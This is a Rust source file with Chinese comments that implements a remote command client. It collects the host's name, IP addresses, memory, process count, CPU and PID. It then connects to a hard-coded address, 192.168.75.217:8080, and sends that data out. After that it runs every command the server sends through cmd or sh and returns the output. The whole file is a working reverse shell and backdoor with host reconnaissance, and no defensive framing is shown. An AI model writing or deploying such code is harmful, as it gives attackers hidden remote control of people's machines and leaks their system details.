use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use sysinfo::{System, SystemExt, CpuExt};
use hostname::get;
use std::net::{IpAddr, Ipv4Addr};
use std::process::{self, Command, Stdio};
use local_ip_address::list_afinet_netifas;

#[tokio::main]
async fn main() {
    // 获取系统信息
    let mut sys = System::new_all();
    sys.refresh_all();

    let total_memory_kb = sys.total_memory(); // 总内存，单位KB
    let process_count = sys.processes().len(); // 进程数量
    let cpu_info = sys.global_cpu_info().brand().to_string(); // CPU信息

    // 获取当前程序的进程 PID
    let current_pid = process::id();

    // 显示系统总内存和当前程序的进程 PID
    println!("系统总内存: {} KB", total_memory_kb);
    println!("当前程序的进程 PID: {}", current_pid);

    // 获取主机名
    let hostname = get()
        .unwrap_or_else(|_| "未知主机".into())
        .into_string()
        .unwrap_or_else(|_| "未知主机".into());

    // 获取IP地址
    let ip_addresses = get_local_ip_addresses();

    // 构建主机信息字符串
    let host_info = format!(
        "主机名: {}\nIP地址: {}\n总内存: {} KB\n进程数量: {}\nCPU信息: {}\n当前程序的进程 PID: {}",
        hostname,
        ip_addresses.join(", "),
        total_memory_kb,
        process_count,
        cpu_info,
        current_pid
    );

    // 连接到服务器
    match TcpStream::connect("192.168.75.217:8080").await {
        Ok(mut stream) => {
            println!("已连接到服务器。");

            // 发送主机信息
            if let Err(e) = stream.write_all(host_info.as_bytes()).await {
                eprintln!("发送主机信息失败: {}", e);
            } else {
                println!("主机信息已发送。");
            }

            // 进入命令监听与执行循环
            let mut buffer = [0; 4096]; // 用于接收服务器的命令
            loop {
                match stream.read(&mut buffer).await {
                    Ok(n) if n > 0 => {
                        let command = String::from_utf8_lossy(&buffer[..n]);
                        println!("收到服务器命令: {}", command);

                        // 执行服务器发送的命令
                        let output = execute_command(&command).await;

                        // 将命令输出发送回服务器
                        if let Err(e) = stream.write_all(output.as_bytes()).await {
                            eprintln!("发送命令结果失败: {}", e);
                        } else {
                            println!("命令结果已发送回服务器。");
                        }
                    }
                    Ok(_) => {
                        println!("服务器已关闭连接。");
                        break;
                    }
                    Err(e) => {
                        eprintln!("读取服务器命令失败: {}", e);
                        break;
                    }
                }
            }
        }
        Err(e) => {
            eprintln!("无法连接到服务器: {}", e);
        }
    }
}

// 异步函数：执行命令并返回结果
async fn execute_command(command: &str) -> String {
    let output = if cfg!(target_os = "windows") {
        Command::new("cmd")
            .args(&["/C", command]) // Windows下使用 cmd 执行命令
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .expect("命令执行失败")
    } else {
        Command::new("sh")
            .arg("-c") // Unix系统下使用 shell 执行命令
            .arg(command)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .output()
            .expect("命令执行失败")
    };

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    // 将标准输出和标准错误组合成一个结果返回
    format!("输出:\n{}\n错误:\n{}", stdout, stderr)
}

// 获取本地主机的IP地址列表
fn get_local_ip_addresses() -> Vec<String> {
    let mut ips = Vec::new();
    if let Ok(addrs) = list_afinet_netifas() {
        for (_name, ip) in addrs {
            if let IpAddr::V4(ipv4) = ip {
                // 排除环回地址
                if ipv4 != Ipv4Addr::new(127, 0, 0, 1) {
                    ips.push(ipv4.to_string());
                }
            }
        }
    }
    ips
}
